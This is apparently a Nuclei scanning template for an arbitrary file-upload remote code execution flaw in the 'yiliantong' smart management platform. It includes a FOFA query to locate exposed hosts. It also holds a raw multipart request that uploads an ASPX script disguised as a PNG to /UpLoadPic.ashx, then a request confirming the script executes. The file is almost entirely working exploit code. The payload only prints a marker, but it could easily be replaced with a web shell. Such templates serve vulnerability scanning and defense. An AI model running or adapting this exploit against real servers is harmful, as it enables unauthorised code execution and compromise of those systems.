id: yiliantong-UpLoadPic-rce
info:
  name: yiliantong-UpLoadPic-rce
  author: lengmo
  severity: critical
  description: yiliantong-UpLoadPic-rce
  tags: yiliantong,rce
  metadata:
    fofa-query: title=="欢迎使用脸爱云 一脸通智慧管理平台"
http:
  - raw:
      - |
        POST /UpLoadPic.ashx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywt7cEu1eBdibB13u
        X-Requested-With: XMLHttpRequest
        Connection: close
 
        ------WebKitFormBoundarywt7cEu1eBdibB13u
        Content-Disposition: form-data; name="action"
 
        post
        ------WebKitFormBoundarywt7cEu1eBdibB13u
        Content-Disposition: form-data; name="myPhoto"; filename="1.aspx"
        Content-Type: image/png
 
        <% response.write("hello1122333") %>
        ------WebKitFormBoundarywt7cEu1eBdibB13u
        Content-Disposition: form-data; name="oldName"
 
 
        ------WebKitFormBoundarywt7cEu1eBdibB13u--
      
      - |
        GET /images/{{fileupload}}.aspx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 

    
    extractors:
      - type: regex
        name: fileupload
        part: body
        internal: true
        group: 1
        regex:
          - 'images/(\w*)\.aspx'


    matchers:
      - type: dsl
        dsl:
          - 'status_code ==200 && contains(header, "text/html") && contains(body, "hello1122333")'